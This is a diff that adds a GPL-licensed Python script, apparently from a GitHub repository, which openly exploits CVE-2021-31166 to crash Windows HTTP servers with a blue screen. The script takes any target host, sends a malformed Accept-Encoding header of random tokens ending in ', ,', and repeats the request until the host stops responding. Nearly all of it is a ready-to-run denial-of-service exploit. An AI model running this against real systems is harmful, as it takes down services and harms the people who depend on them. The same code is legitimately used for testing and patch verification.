@@ -1,0 +1,95 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+This script exploit the CVE-2021-31166 for a DOS (Denial of Service) attack (Blue Screen).
+
+>>> import CVE202131166
+
+~# python3 CVE202131166.py
+"""
+
+###################
+#    This script exploit the CVE-2021-31166 for a DOS (Denial of Service) attack (Blue Screen).
+#    Copyright (C) 2022  Maurice Lambert
+
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
+###################
+
+__version__ = "1.0.0"
+__author__ = "Maurice Lambert"
+__author_email__ = "mauricelambert434@gmail.com"
+__maintainer__ = "Maurice Lambert"
+__maintainer_email__ = "mauricelambert434@gmail.com"
+__description__ = """
+This script exploit the CVE-2021-31166 for a DOS (Denial of Service) attack (Blue Screen).
+"""
+license = "GPL-3.0 License"
+__url__ = "https://github.com/mauricelambert/CVE-2021-31166"
+
+copyright = """
+CVE-2021-31166  Copyright (C) 2022  Maurice Lambert
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions.
+"""
+__license__ = license
+__copyright__ = copyright
+
+__all__ = []
+
+print(copyright)
+
+from urllib.error import URLError, HTTPError
+from urllib.request import Request, urlopen
+from random import randint, choices
+from sys import exit, stderr, argv
+from string import ascii_lowercase
+from socket import timeout
+
+host = argv[1] if len(argv) == 2 else input("Target: ")
+
+# Generate random payload
+payload = ", ".join("".join(choices(ascii_lowercase, k=randint(2, 5))) for i in range(randint(1, 6))) + ", ,"
+
+headers = {
+    "Accept-Encoding": payload,
+}
+
+try:
+    urlopen(f"http://{host}")  # Check if host ip UP
+except HTTPError:
+    pass
+except Exception as e:
+    print(f"[!] http://{host} is not UP (get no response).")
+    print(f"{e.__class__.__name__}: {e}", file=stderr)
+    exit(1)
+
+print(f"[+] http://{host} is UP. Send payload...")
+
+while True:
+    try:
+        urlopen(Request(f"http://{host}", headers=headers))
+    except (timeout, TimeoutError, URLError):
+        print(
+            f"[+] http://{host} is DOWN. {host} is vulnerable to CVE-2021-31166."
+        )
+        exit(0)
+    except HTTPError:
+        pass
+    except Exception as e:
+        print(f"{e.__class__.__name__}: {e}", file=stderr)
+
+    print("[!] Host is up.", file=stderr)
+    print("[+] Payload sent successfully. Try new request...")
